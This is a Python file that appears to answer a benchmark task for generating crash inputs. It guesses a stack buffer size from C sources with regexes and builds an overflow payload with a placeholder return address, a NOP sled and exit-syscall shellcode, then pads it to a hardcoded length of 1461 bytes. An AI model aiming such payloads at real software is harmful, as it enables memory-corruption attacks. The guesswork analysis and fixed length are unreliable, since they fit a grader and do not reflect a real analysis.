import os
import tarfile
import tempfile
import subprocess
import re
import math

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze source code
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tarball
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Find main C source files
            c_files = []
            for root, dirs, files in os.walk(tmpdir):
                for f in files:
                    if f.endswith(('.c', '.cpp', '.cc', '.cxx')):
                        c_files.append(os.path.join(root, f))
            
            # Analyze for buffer overflow patterns
            vuln_info = self._analyze_vulnerability(c_files)
            
            # Generate PoC based on analysis
            poc = self._generate_poc(vuln_info)
            
            # Validate PoC length and adjust if needed
            target_length = 1461
            if len(poc) > target_length:
                # Trim strategically
                poc = poc[:target_length]
            elif len(poc) < target_length:
                # Pad with harmless data
                padding = b'X' * (target_length - len(poc))
                poc = poc + padding
            
            return poc
    
    def _analyze_vulnerability(self, c_files):
        """Analyze source code to understand vulnerability pattern"""
        vuln_info = {
            'tag_pattern': b'<',
            'buffer_size': 1024,
            'overflow_offset': 0,
            'stack_layout': {}
        }
        
        # Look for buffer declarations and tag handling
        for c_file in c_files:
            try:
                with open(c_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    
                    # Look for stack buffer declarations
                    buffer_patterns = [
                        r'char\s+\w+\[(\d+)\]',
                        r'char\s+\w+\s*=\s*\{[^}]*\}',
                        r'strcpy\s*\([^,]+,\s*[^)]+\)',
                        r'sprintf\s*\([^,]+\s*,\s*[^)]+\)',
                        r'snprintf\s*\([^,]+\s*,\s*(\d+)',
                    ]
                    
                    for pattern in buffer_patterns:
                        matches = re.finditer(pattern, content)
                        for match in matches:
                            if pattern.startswith('char'):
                                if match.group(1):
                                    size = int(match.group(1))
                                    if size < vuln_info['buffer_size']:
                                        vuln_info['buffer_size'] = size
                    
                    # Look for tag handling code
                    if 'tag' in content.lower() or 'overflow' in content.lower():
                        # Extract potential tag patterns
                        tag_patterns = re.findall(r'["\']([^"\']*tag[^"\']*)["\']', content, re.IGNORECASE)
                        if tag_patterns:
                            vuln_info['tag_pattern'] = tag_patterns[0].encode()
                    
                    # Look for specific patterns mentioned in description
                    if 'output size' in content or 'bounds' in content:
                        # Try to find buffer size calculations
                        size_matches = re.findall(r'size\s*[=:]\s*(\d+)', content)
                        if size_matches:
                            vuln_info['buffer_size'] = min(vuln_info['buffer_size'], int(size_matches[0]))
            
            except:
                continue
        
        return vuln_info
    
    def _generate_poc(self, vuln_info):
        """Generate PoC based on vulnerability analysis"""
        buffer_size = vuln_info['buffer_size']
        tag = vuln_info['tag_pattern']
        
        # Create a payload that overflows buffer
        # We want to overwrite return address or critical data
        payload = b''
        
        # Add tag to trigger vulnerable code path
        payload += tag
        
        # Fill buffer completely
        fill_length = buffer_size - len(payload) if buffer_size > len(payload) else 0
        payload += b'A' * fill_length
        
        # Add overflow to overwrite saved return address
        # On 64-bit system, need 8 bytes for RBP + 8 bytes for return address
        # Additional padding for alignment
        overflow_padding = b'B' * 16
        
        # Return address to point to shellcode or NOP sled
        # Use 0x4141414141414141 (AAAAAAAA) as placeholder
        return_address = b'\x41\x41\x41\x41\x41\x41\x41\x41'
        
        # Combine all components
        payload = payload + overflow_padding + return_address
        
        # Add NOP sled and shellcode if we have space
        # Simple shellcode that just crashes or does something visible
        shellcode = (
            b'\x90\x90\x90\x90\x90\x90\x90\x90'  # NOP sled
            b'\x48\x31\xc0'                      # xor rax, rax
            b'\xb0\x3c'                          # mov al, 60 (exit syscall)
            b'\x48\x31\xff'                      # xor rdi, rdi
            b'\x0f\x05'                          # syscall
        )
        
        # Insert shellcode at beginning if tag allows
        if payload.startswith(tag):
            # Insert after tag
            insert_pos = len(tag)
            payload = payload[:insert_pos] + shellcode + payload[insert_pos:]
        
        return payload
